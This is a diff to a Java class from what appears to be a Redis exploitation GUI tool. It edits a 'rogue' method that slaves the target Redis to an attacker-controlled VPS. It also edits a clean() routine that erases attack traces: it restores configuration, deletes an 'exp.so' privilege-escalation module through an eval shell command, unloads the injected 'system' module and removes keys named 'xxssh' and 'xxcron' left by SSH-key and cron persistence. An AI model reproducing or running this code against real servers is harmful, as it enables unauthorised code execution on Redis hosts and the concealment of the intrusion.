@@ -22,7 +22,7 @@ public class RedisDao {
 
     public static Jedis CONN;
     public static List<String> dir;
-    public static String slaveReadOnlyFlag;
+    public static String slaveReadOnlyFlag = "yes";
 
     private String ip;
     private int port;
@@ -152,11 +152,11 @@ public class RedisDao {
 
     }
 
-    public void rogue(String vpsip, String vpsport, int timeout) throws InterruptedException {
+    public void rogue(String vpsip, String vpsport, int timeout) throws Exception {
         redisslave(vpsip, vpsport);
 
         Platform.runLater(() -> {
-            redisController.redisLogTextFArea.appendText(Utils.log("Setting dbfilename..."));
+            redisController.redisLogTextFArea.appendText(Utils.log("设置 dbfilename 参数！"));
         });
         List<String> slaveReadOnlyList = CONN.configGet("slave-read-only");
         slaveReadOnlyFlag = slaveReadOnlyList.get(1);
@@ -222,36 +222,42 @@ public class RedisDao {
      * 3. 卸载导入so函数
      */
     public void clean() {
-        CONN.configSet("dir", dir.get(1));
-        Platform.runLater(() -> {
-            redisController.redisLogTextFArea.appendText(Utils.log("重设 Dir 参数成功！"));
-        });
+        try {
+            CONN.configSet("dir", dir.get(1));
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("重设 Dir 参数成功！"));
+            });
 
-        CONN.configSet("slave-read-only", slaveReadOnlyFlag);
-        Platform.runLater(() -> {
-            redisController.redisLogTextFArea.appendText(Utils.log("重设 slave-read-only 成功！"));
-        });
-        CONN.configSet("dbfilename", "dump.rdb");
-        Platform.runLater(() -> {
-            redisController.redisLogTextFArea.appendText(Utils.log("重设 dbfilename 参数成功！"));
-        });
-        CONN.slaveofNoOne();
-        Platform.runLater(() -> {
-            redisController.redisLogTextFArea.appendText(Utils.log("重设 slaveof 成功"));
-        });
-        eval("rm -f " + dir.get(1) + "/exp.so", "UTF-8");
-        Platform.runLater(() -> {
-            redisController.redisLogTextFArea.appendText(Utils.log("删除 exp 提权模块成功！"));
-        });
-        CONN.moduleUnload("system");
-        Platform.runLater(() -> {
-            redisController.redisLogTextFArea.appendText(Utils.log("卸载函数成功过！"));
-        });
-        CONN.del("xxssh");
-        CONN.del("xxcron");
-        Platform.runLater(() -> {
-            redisController.redisLogTextFArea.appendText(Utils.log("删除 Key 成功！"));
-        });
+            CONN.configSet("slave-read-only", slaveReadOnlyFlag);
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("重设 slave-read-only 成功！"));
+            });
+            CONN.configSet("dbfilename", "dump.rdb");
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("重设 dbfilename 参数成功！"));
+            });
+            CONN.slaveofNoOne();
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("重设 slaveof 成功"));
+            });
+            eval("rm -f " + dir.get(1) + "/exp.so", "UTF-8");
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("删除 exp 提权模块成功！"));
+            });
+            CONN.moduleUnload("system");
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("卸载函数成功！"));
+            });
+            CONN.del("xxssh");
+            CONN.del("xxcron");
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("删除 Key 成功！"));
+            });
+        }catch (Exception e){
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(e, e.getMessage());
+            });
+        }
     }
 
 }
